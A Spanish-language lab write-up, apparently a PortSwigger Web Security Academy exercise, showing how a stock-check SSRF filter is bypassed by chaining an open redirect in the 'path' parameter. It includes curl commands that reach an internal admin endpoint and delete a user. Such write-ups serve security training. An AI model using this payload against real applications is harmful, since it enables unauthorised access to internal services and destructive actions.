

#Nombre del Lab: [Lab: SSRF with filter bypass via open redirection vulnerability]

**Tema:** [Ej: SSRF]

**Dificultad:** [Media]

**Herramientas:** [curl]

---

### 1. Reconocimiento

Se realiza un análisis inicial para identificar puntos de entrada y 
el comportamiento de la aplicación.

* **Comando:** `curl -v [URL]`
* **Observación:** se detecta que la aplicacion tiene un redireccionamiento 
a un siguiente producto, ademas de esto si intentamos realizar una ssrf 
basica al stock/ide nos bloqueara por razones de seguridad.
```html 
<form id="stockCheckForm" action="/product/stock" method="POST">
                            <select name="stockApi">
                                <option value="/product/stock/check?productId=3&storeId=1">London</option>
                                <option value="/product/stock/check?productId=3&storeId=2">Paris</option>
                                <option value="/product/stock/check?productId=3&storeId=3">Milan</option>
                            </select>
                            <button type="submit" class="button">Check stock</button>
                        </form>
                        <span id="stockCheckResult"></span>
                        <script src="/resources/js/stockCheckPayload.js"></script>
                        <script src="/resources/js/stockCheck.js"></script>
                        <div class="is-linkback">
                            <a href="/">Return to list</a>
                            <a href="/product/nextProduct?currentProductId=3&path=/product?productId=4">| Next product</a>
                        </div>
                    </section>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>```

### 2. Identificación de la Vulnerabilidad

Descripción del fallo encontrado y por qué ocurre.

* **Punto de inyección:** [Parámetro `path` en `<a href="/product/nextProduct?currentProductId=3&path=/product?productId=4">`]
* **Tipo de vulnerabilidad:** [SSRF mediante filtro de bypass por redireccion abierta
]

### 3. Explotación

Pasos realizados para confirmar y explotar la vulnerabilidad.

1. **Construcción del payload:** 
[utilizamos el <a href="/product/nextProduct?currentProductId=3%26path="http://192.168.0.12:8080/admin`]

2. **Ejecución:**
```bash
curl -X POST -d "stockApi=/product/nextProduct?currentProductId=3%26path=http://192.168.0.12:8080/admin/delete?username=carlos" "http://{ide_lab}.web-security-academy.net/product/stock"

```



### 4. Resultado / Prueba de Concepto (PoC)

* **Acción final:** 
```curl -X POST "https://{ip}.web-security-academy.net/product/stock"
 -d "stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos" -v

```
* **Estado:** Resuelto / Explotado.

